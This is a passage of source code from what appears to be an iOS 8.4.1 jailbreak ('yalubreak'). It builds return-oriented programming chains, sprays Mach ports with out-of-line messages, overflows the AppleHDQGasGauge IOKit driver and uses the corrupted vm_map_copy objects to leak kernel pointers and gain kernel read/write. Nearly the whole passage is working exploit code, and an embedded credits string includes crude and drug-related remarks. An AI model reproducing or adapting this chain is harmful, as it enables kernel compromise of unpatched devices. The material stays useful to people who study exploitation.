push = (uint32_t)read_ptr_0 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
assert((uint32_t)ptr);\
push = (uint32_t)ptr;\
push = (uint32_t)e;\
push = (uint32_t)f;\
push = (uint32_t)g;\
push = (uint32_t)h;\
push = (uint32_t)i;\
RopNopSlide(push)
    
#define RopCallDerefFunctionPointer10Deref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l) \
RopFixupLR(push);\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)fptr_deref - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = (4*(28 + 12)) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_1 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r3r4r7pc;\
push = (uint32_t)read_ptr_0 - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch); \
push = (uint32_t)0x13371337;\
push = (uint32_t)e;\
push = (uint32_t)f;\
push = (uint32_t)g;\
push = (uint32_t)h;\
push = (uint32_t)i;\
push = (uint32_t)l;\
RopNopSlide(push)
    
#define RopCallFunction9(push, name, a, b, c, d, e, f, g, h, i) RopCallFunction10(push, name, a, b, c, d, e, f, g, h, i, 0)
#define RopCallFunction8(push, name, a, b, c, d, e, f, g, h) RopCallFunction9(push, name, a, b, c, d, e, f, g, h, 0)
#define RopCallFunction7(push, name, a, b, c, d, e, f, g) RopCallFunction8(push, name, a, b, c, d, e, f, g, 0)
#define RopCallFunction6(push, name, a, b, c, d, e, f) RopCallFunction7(push, name, a, b, c, d, e, f, 0)
#define RopCallFunction5(push, name, a, b, c, d, e) RopCallFunction6(push, name, a, b, c, d, e, 0)
#define RopCallFunction4(push, name, a, b, c, d) RopCallFunction5(push, name, a, b, c, d, 0)
#define RopCallFunction3(push, name, a, b, c) RopCallFunction4(push, name, a, b, c, 0)
#define RopCallFunction2(push, name, a, b) RopCallFunction3(push, name, a, b, 0)
#define RopCallFunction1(push, name, a) RopCallFunction2(push, name, a, 0)
#define RopCallFunction0(push, name) RopCallFunction1(push, name, 0)
    
#define RopAddWrite(push, where, what) \
LoadIntoR0(push, where);\
push = pop_r2pc;\
push = what;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
StoreR0(push, where)
    
#define RopAddR0(push, what) \
push = pop_r2pc;\
push = what;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\

#define RopAddWriteDeref(push, where, whatptr) \
LoadIntoR0(push, whatptr);\
push = (uint32_t)pop_r4r7pc;\
tmp = (4*6) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = pop_r2pc;\
push = 0;\
LoadIntoR0(push, where);\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
StoreR0(push, where)
#define kern_uint_t uint64_t
    
    struct vm_map_copy {
        kern_uint_t type;
        kern_uint_t obj;
        kern_uint_t sz;
        kern_uint_t ptr;
        kern_uint_t kfree_size;
    } ;
    
    typedef struct args {
        uint32_t cache_slide;
        uint32_t cache_map;
        mach_port_t mach_task_self;
        mach_port_t mach_host_self;
        mach_port_t master_port;
        io_service_t svc;
        io_service_t pmroot_svc;
        io_iterator_t itr;
        io_connect_t gasgauge;
        io_connect_t gasgauge_;
        io_connect_t rootdomain;
        kern_return_t io_service_open_return;
        int _io_service_get_matching_service;
        int _IOServiceOpen;
        int _IOServiceClose;
        int _IOServiceWaitQuiet;
        int _host_get_io_master;
        int _io_connect_method_scalarI_structureI;
        int copyaddr;
        int readaddr;
        char structData[2048];
        int structSize;
        uint64_t inputScalar[1];
        char initmsg[2048];
        char testmsg[128];
        char gasgauge_match[256];
        char rootdomainuserclient_match[256];
        char a[256];
        char b[256];
        char c[256];
        char msga[256];
        char msgb[256];
        int zero;
        int fd1;
        int fd2;
        int fd3;
        char* oflow_leakedbytes;
        struct vm_map_copy* oflow_vm_map;
        oolmsg_t oolmsg_template;
        oolmsg_t oolmsg_template_2048;
        oolmsg_t oolmsg_template_512;
        oolmsgrcv_t cur_oolmsg;
        oolmsgrcv_t tmp_msg;
        oolmsgrcv_t oflow_msg;
#define overlap_port 955
#define overlapped_port 950
        mach_port_t holder[1000];
        char oolbuf[2048];
        int x;
        int tmp1;
        int tmp2;
        uint64_t kern_alloc_1024;
        uint64_t vptr;
        uint64_t kern_slide;
        uint64_t kern_text_base;
        char mscratch[8192];
        char scratch[8192];
        mach_timespec_t waitTime;
    } args_t;
    
    args_t args_s;
    bzero(&args_s, sizeof(args_s));
    args_t* argss = &args_s;
    args_t* args_seg = (args_t*) 0x52000000;
    
#define m_m_scratch ((uint32_t)(&(args_seg->mscratch)[1024]))
#define PUSH (*stack++)
#define SEG_VAR(var) ((char*)(&(args_seg->var)))
#define SEG_VAR_(var, i) ((uint32_t)(&((args_seg->var)[i])))
    
    argss->waitTime.tv_sec = 10;
    argss->waitTime.tv_nsec = 10000000;
    
    argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - _DYCACHE_BASE + 1;
    argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - _DYCACHE_BASE + 1;
    argss->_IOServiceOpen = IOKIT_IOServiceOpen - _DYCACHE_BASE + 1;
    argss->_IOServiceClose = IOKIT_IOServiceClose - _DYCACHE_BASE + 1;
    argss->_IOServiceWaitQuiet = IOKIT_IOServiceWaitQuiet - _DYCACHE_BASE + 1;
    argss->_host_get_io_master = LS_K_host_get_io_master - _DYCACHE_BASE + 1;
    argss->oolmsg_template.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    argss->oolmsg_template.header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    argss->oolmsg_template.header.msgh_local_port = MACH_PORT_NULL;
    argss->oolmsg_template.header.msgh_size = sizeof(oolmsg_t);
    argss->oolmsg_template.header.msgh_id = 1;
    argss->oolmsg_template.body.msgh_descriptor_count = 1;
    argss->oolmsg_template.desc.address = (void *)SEG_VAR(oolbuf);
    argss->oolmsg_template.desc.type = MACH_MSG_OOL_DESCRIPTOR;
    memcpy(&argss->oolmsg_template_2048, &argss->oolmsg_template, sizeof(oolmsg_t));
    memcpy(&argss->oolmsg_template_512, &argss->oolmsg_template, sizeof(oolmsg_t));
    
    argss->oolmsg_template_2048.desc.size = 2048 - 0x58;
    argss->oolmsg_template_512.desc.size = 512 - 0x58;
    argss->oolmsg_template.desc.size = 1024 - 0x58;
    
    memset(&argss->oolbuf[0], 0x0, 1024);
    uint32_t tmp;
    *stack++ = 0x44444444;
    *stack++ = m_m_scratch;
    
    strcpy(argss->initmsg, "yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\n");
    
    strcpy(argss->gasgauge_match, "<dict><key>IOProviderClass</key><string>AppleHDQGasGaugeControl</string></dict>");
    strcpy(argss->rootdomainuserclient_match, "<dict><key>IOProviderClass</key><string>IOPMrootDomain</string></dict>");
    strcpy(argss->a, "/var/mobile/Media/kjc_jb.log");
    strcpy(argss->b, "/var/mobile/Media/vm_map_dump");
    strcpy(argss->c, "/var/mobile/Media/kern_dump");
    strcpy(argss->msga, "found overlapping object\n");
    strcpy(argss->msgb, "found overlapped object\n");
    strcpy(argss->testmsg, "ret: %08x\n");
    
    RopFixupLR(PUSH);
    RopCallFunction2(PUSH, @"___syscall", 294, SEG_VAR(cache_slide));
    RopCallFunction3(PUSH, @"_open", SEG_VAR(a), O_RDWR|O_CREAT|O_APPEND, 0666);
    StoreR0(PUSH, SEG_VAR(fd1));
    RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
    StoreR0(PUSH, SEG_VAR(fd2));
    RopCallFunction3(PUSH, @"_open", SEG_VAR(c), O_RDWR|O_CREAT|O_TRUNC, 0666);
    StoreR0(PUSH, SEG_VAR(fd3));
    
    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceClose), SEG_VAR(cache_slide));
    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI), SEG_VAR(cache_slide));
    RopAddWriteDeref(PUSH, SEG_VAR(_io_service_get_matching_service), SEG_VAR(cache_slide));
    RopAddWriteDeref(PUSH, SEG_VAR(_host_get_io_master), SEG_VAR(cache_slide));

    RopCallFunction0(PUSH, @"_task_self_trap");
    StoreR0(PUSH, SEG_VAR(mach_task_self));
    
    RopCallFunction0(PUSH, @"_host_self_trap");
    StoreR0(PUSH, SEG_VAR(mach_host_self));
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_host_get_io_master), 0, SEG_VAR(mach_host_self), 4, SEG_VAR(zero), 0, SEG_VAR(master_port), 0, 0, 0, 0, 0, 0, 0,0);
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_service_get_matching_service), 0, SEG_VAR(master_port), 6, SEG_VAR(zero), 0, SEG_VAR(gasgauge_match), SEG_VAR(svc), 0, 0, 0, 0, 0, 0,0);
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge), 0, 0, 0, 0, 0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
    for (int i = 3; i < 500; i++) {
        RopCallFunction9Deref2(PUSH, @"__kernelrpc_mach_port_allocate_trap", 0, SEG_VAR(mach_task_self), 5, SEG_VAR(zero), 0, MACH_PORT_RIGHT_RECEIVE, SEG_VAR(holder[i]), 0, 0, 0, 0, 0, 0);
        RopCallFunction9Deref3(PUSH, @"__kernelrpc_mach_port_insert_right_trap", 0, SEG_VAR(mach_task_self), 1, SEG_VAR(holder[i]), 2, SEG_VAR(holder[i]), 0, 0, 0, MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0, 0, 0);
        LoadIntoR0(PUSH, SEG_VAR(holder[i]));
        StoreR0(PUSH, SEG_VAR(oolmsg_template.header.msgh_remote_port));
        RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(oolmsg_template), MACH_SEND_MSG, sizeof(oolmsg_t));
    }
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref3(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 3, SEG_VAR(gasgauge), 2, SEG_VAR(master_port), 0, SEG_VAR(initmsg), 0, 0, 0, 0, 0, 0, 0);
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(cache_slide),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[480]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI),
                                        0, SEG_VAR(gasgauge),
                                        9, SEG_VAR(zero),
                                        0, 12,
                                        SEG_VAR(inputScalar), 1,
                                        SEG_VAR(structData), (1024+0x100),
                                        0,0,0,0); // overflow
    
    StoreR0(PUSH, SEG_VAR(io_service_open_return));
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(io_service_open_return),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
#define RecvMsg(push, i, msg) \
LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
RopCallFunction9Deref2(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[i]), 5, SEG_VAR(zero), SEG_VAR(msg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0)
    
#define SendMsg(push, i, msg) \
LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oolmsg_t))
    
    /* read-out corrupted vm_map_copy, causing wrong kfree() & write to adjacent page */
    
    for (int i = 450; i < 500; i++) {
        if (i != 480) {
            WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
            RecvMsg(PUSH, i, oflow_msg);
            StoreR0(PUSH, SEG_VAR(tmp1));
            
            PUSH = pop_r4r7pc; // PC
            uint32_t* wcmpl = stack;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            uint32_t send_1024_cont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            SendMsg(PUSH, i, oolmsg_template);
            PUSH = pop_r4r7pc; // PC
            uint32_t* wcont = stack;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            uint32_t send_2048_break = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
            StoreR0(PUSH, SEG_VAR(holder[overlap_port]));
            SendMsg(PUSH, i, oolmsg_template_2048);
            
            [dy setSlide:dy.slide+1]; // enter thumb
            RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(msga),0,0,0,0,0,0,0);
            [dy setSlide:dy.slide-1]; // exit thumb
            
            WriteWhatWhere(PUSH,0,SEG_VAR(holder[i]));
            
            RopCallFunction9Deref2(PUSH, @"__kernelrpc_mach_port_allocate_trap", 0, SEG_VAR(mach_task_self), 5, SEG_VAR(zero), 0, MACH_PORT_RIGHT_RECEIVE, SEG_VAR(holder[i]), 0, 0, 0, 0, 0, 0);
            RopCallFunction9Deref3(PUSH, @"__kernelrpc_mach_port_insert_right_trap", 0, SEG_VAR(mach_task_self), 1, SEG_VAR(holder[i]), 2, SEG_VAR(holder[i]), 0, 0, 0, MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0, 0, 0);
            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
            StoreR0(PUSH, SEG_VAR(oolmsg_template.header.msgh_remote_port));
            RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(oolmsg_template), MACH_SEND_MSG, sizeof(oolmsg_t));
            SendMsg(PUSH, i, oolmsg_template);
            
            
            PUSH = pop_r4r7pc; // PC
            PUSH = segstackybase; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            *wcmpl = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            
            /* execute comparison */
            
            WriteWhatWhere(PUSH, m_m_scratch, SEG_VAR(tmp2));
            LoadIntoR0(PUSH, SEG_VAR(tmp1));
            
            PUSH = not_r0_pop_r4r7pc;
            PUSH = (uint32_t)SEG_VAR(tmp2);
            PUSH = m_m_scratch;
            PUSH = not_r0_pop_r4r7pc;
            PUSH = (uint32_t)SEG_VAR(tmp2);
            PUSH = m_m_scratch;
            
            
            PUSH = pop_r2pc;
            PUSH = 4*6;
            PUSH = muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc;
            PUSH = 0x44444444; // R4
            PUSH = 0x45454545; // R5
            PUSH = m_m_scratch; // R7
            PUSH = pop_r2pc;
            uint32_t* spz = stack;
            PUSH = 0;
            PUSH = add_r0_r2_pop_r4r5r7pc;
            PUSH = 0x44444444; // R4
            PUSH = 0x45454545; // R5
            PUSH = m_m_scratch; // R7
            
            PUSH = (uint32_t)pop_r4r7pc;
            uint32_t *tgt = stack;
            PUSH = - 8;
            PUSH = (uint32_t)m_m_scratch;
            PUSH = (uint32_t)str_r0_r4_8_pop_r4r7pc;
            PUSH = (uint32_t)0x44444444;
            PUSH = (uint32_t)m_m_scratch;
            
            PUSH = pop_r4r7pc; // PC
            *tgt += (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            *spz = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            
            PUSH = 0x44444444;
            PUSH = m_m_scratch;
            PUSH = pop_r4r7pc; // PC
            PUSH = send_1024_cont; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            PUSH = 0x44444444;
            PUSH = m_m_scratch;
            PUSH = pop_r4r7pc; // PC
            PUSH = send_2048_break; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            *wcont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            
        }
    }
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(testmsg),13,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    RecvMsg(PUSH, 480, oflow_msg); // hang
    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
    
    stack = (uint32_t*)stacky;
    segstackbase = (uint32_t)segstackybase;
    stackbase = (uint32_t*)stack;
    PUSH = 0x44444444; // R4
    PUSH = m_m_scratch; // R7
    
    for (int i = 450; i < 500; i++) {
        if (i != 480) {
            WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
            RecvMsg(PUSH, i, oflow_msg);
            StoreR0(PUSH, SEG_VAR(tmp1));
            
            PUSH = pop_r4r7pc; // PC
            uint32_t* wcmpl = stack;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            uint32_t send_1024_cont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            SendMsg(PUSH, i, oolmsg_template);
            PUSH = pop_r4r7pc; // PC
            uint32_t* wcont = stack;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            uint32_t send_1024_break = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            [dy setSlide:dy.slide+1]; // enter thumb
            RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(msgb),0,0,0,0,0,0,0);
            [dy setSlide:dy.slide-1]; // exit thumb
            
            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
            StoreR0(PUSH, SEG_VAR(holder[overlapped_port]));
            SendMsg(PUSH, i, oolmsg_template);
            
            PUSH = pop_r4r7pc; // PC
            PUSH = segstackzbase; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            *wcmpl = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            
            /* execute comparison */
            
            WriteWhatWhere(PUSH, m_m_scratch, SEG_VAR(tmp2));
            LoadIntoR0(PUSH, SEG_VAR(tmp1));
            
            PUSH = not_r0_pop_r4r7pc;
            PUSH = (uint32_t)SEG_VAR(tmp2);
            PUSH = m_m_scratch;
            PUSH = not_r0_pop_r4r7pc;
            PUSH = (uint32_t)SEG_VAR(tmp2);
            PUSH = m_m_scratch;
            
            PUSH = pop_r2pc;
            PUSH = 4*6;
            PUSH = muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc;
            PUSH = 0x44444444; // R4
            PUSH = 0x45454545; // R5
            PUSH = m_m_scratch; // R7
            PUSH = pop_r2pc;
            uint32_t* spz = stack;
            PUSH = 0;
            PUSH = add_r0_r2_pop_r4r5r7pc;
            PUSH = 0x44444444; // R4
            PUSH = 0x45454545; // R5
            PUSH = m_m_scratch; // R7
            
            PUSH = (uint32_t)pop_r4r7pc;
            uint32_t *tgt = stack;
            PUSH = - 8;
            PUSH = (uint32_t)m_m_scratch;
            PUSH = (uint32_t)str_r0_r4_8_pop_r4r7pc;
            PUSH = (uint32_t)0x44444444;
            PUSH = (uint32_t)m_m_scratch;
            
            PUSH = pop_r4r7pc; // PC
            *tgt += (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            *spz = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            
            PUSH = 0x44444444;
            PUSH = m_m_scratch;
            PUSH = pop_r4r7pc; // PC
            PUSH = send_1024_cont; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            
            PUSH = 0x44444444;
            PUSH = m_m_scratch;
            PUSH = pop_r4r7pc; // PC
            PUSH = send_1024_break; // R4
            PUSH = m_m_scratch; // R7
            PUSH = mov_sp_r4_pop_r4r7pc; // PC
            
            *wcont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
            PUSH = 0x44444444; // R4
            PUSH = m_m_scratch; // R7
            
        }
    }
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(testmsg),72,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    RecvMsg(PUSH, 480, oflow_msg); // hang
    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
    
    stack = (uint32_t*)stackz;
    segstackbase = (uint32_t)segstackzbase;
    stackbase = (uint32_t*)stack;
    
    PUSH = 0x44444444; // R4
    PUSH = m_m_scratch; // R7
    
    
#define ReadWriteOverlap() \
RecvMsg(PUSH, overlap_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template_2048.desc.address));\
SendMsg(PUSH, overlap_port, oolmsg_template_2048);
    
#define ReadWriteScratchOverlap() \
RecvMsg(PUSH, overlap_port, tmp_msg);\
WriteWhatWhere(PUSH, SEG_VAR(scratch), SEG_VAR(oolmsg_template_2048.desc.address));\
SendMsg(PUSH, overlap_port, oolmsg_template_2048);
    
    
#define ReadWriteOverlapped1024() \
RecvMsg(PUSH, overlapped_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template.desc.address));\
SendMsg(PUSH, overlapped_port, oolmsg_template);
    
#define ReadWriteOverlapped512() \
RecvMsg(PUSH, overlapped_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template_512.desc.address));\
SendMsg(PUSH, overlapped_port, oolmsg_template_512);
    
    
    
#define step(x) \
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
RopAddR0(PUSH, 1024 - 0x58 + x);\
DerefR0(PUSH);\
StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + x]))
    
#define tmptoscratch() \
for (int i = 0; i < 0x58; i += 4) {\
step(i);\
}
    
    ReadWriteOverlap();
    
    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
    
    /* read out pointer to overlappped alloc */
    
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 1024 - 0x58 + 0x18);
    DerefR0(PUSH);
    RopAddR0(PUSH, -0x58);
    StoreR0(PUSH, SEG_VAR(kern_alloc_1024));
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 1024 - 0x58 + 0x18 + 4);
    DerefR0(PUSH);
    StoreR0(PUSH, SEG_VAR(kern_alloc_1024)+4);
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_alloc_1024)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_alloc_1024),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
    ReadWriteOverlap();
    tmptoscratch();
    WriteWhatWhere(PUSH, 500, SEG_VAR(scratch[1024 - 0x58 + 0x20]));
    ReadWriteScratchOverlap();
    
    ReadWriteOverlapped512();
    
    ReadWriteOverlap();
    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
    
    RecvMsg(PUSH, overlapped_port, tmp_msg);
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
    ReadWriteOverlap();
